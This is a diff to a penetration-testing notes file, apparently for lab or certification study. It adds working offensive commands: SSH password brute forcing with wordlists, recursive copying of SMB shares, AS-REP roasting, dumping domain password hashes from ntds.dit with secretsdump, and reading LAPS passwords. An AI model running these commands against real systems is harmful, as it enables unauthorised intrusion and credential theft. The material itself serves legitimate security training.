@@ -189,6 +189,7 @@ SSH
 or if that doesnt work
 
 </rich_text>
+          <rich_text justification="left"></rich_text>
           <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.11.1.</codebox>
           <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt
 </codebox>
@@ -1293,7 +1294,7 @@ _____________________________________
         <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
-      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1689017974">
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1689886936">
         <rich_text scale="h1">Nmap</rich_text>
         <rich_text>
 
@@ -1309,7 +1310,17 @@ vuln scan:
 </rich_text>
         <rich_text justification="left"></rich_text>
         <rich_text>
+_____________________________________
 
+
+</rich_text>
+        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 _________________________________________________
 
 </rich_text>
@@ -1386,16 +1397,21 @@ Also check
 </rich_text>
         <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.11.1.</codebox>
         <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.11.1.</codebox>
-        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
-        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
-        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
-        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
-        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
-        <codebox char_offset="355" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1.</codebox>
-        <codebox char_offset="376" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
+        <codebox char_offset="124" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.11.1./directoryName -U &lt;username&gt;
+
+recurse ON
+prompt OFF
+mget *</codebox>
+        <codebox char_offset="185" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
+        <codebox char_offset="209" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
+        <codebox char_offset="259" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
+        <codebox char_offset="323" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
+        <codebox char_offset="330" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
+        <codebox char_offset="436" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1.</codebox>
+        <codebox char_offset="457" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
 Password: &lt;password&gt;</codebox>
-        <codebox char_offset="410" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
-        <codebox char_offset="435" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
+        <codebox char_offset="491" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
+        <codebox char_offset="516" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
       </node>
       <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1689473294">
         <rich_text>
@@ -1503,7 +1519,7 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
           </node>
         </node>
         <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
-          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690744">
+          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
 
@@ -1517,10 +1533,10 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
             <rich_text>
 </rich_text>
             <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 
 ### Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 
 
 ### Get  ASREPMessage without pass  
@@ -1532,7 +1548,7 @@ or
 python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
 </codebox>
           </node>
-          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690752">
+          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887979">
             <rich_text>
 </rich_text>
             <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
@@ -1543,10 +1559,29 @@ python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pas
             <rich_text justification="left"></rich_text>
             <rich_text>
 
+___________________________________________________________
+
+</rich_text>
+            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+ex:
+
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
 </rich_text>
             <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
 or 
 impacket-secretsdump domain.local/user@10.11.1.</codebox>
+            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
+            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system &lt;SYSTEM&gt; LOCAL</codebox>
           </node>
           <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
             <rich_text>Exploitation via pass the hash
@@ -1884,7 +1919,7 @@ whoami&#13;
 nt authority\system</codebox>
           </node>
         </node>
-        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1688935332">
+        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689800126">
           <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
           <rich_text>
 
@@ -1984,6 +2019,17 @@ Grabbing the Laps password
 
 </rich_text>
           <rich_text justification="left"></rich_text>
+          <rich_text>
+
+______________________________
+
+
+</rich_text>
+          <rich_text scale="h2">SSH Brute Force</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
           <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.</codebox>
           <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --shares
 
@@ -2005,6 +2051,7 @@ crackmapexec smb 10.11.1. -u admin -p abcd1234 --shares</codebox>
           <codebox char_offset="441" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
           <codebox char_offset="502" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
           <codebox char_offset="605" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.11.1. -M laps</codebox>
+          <codebox char_offset="658" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
         </node>
         <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1688916050">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
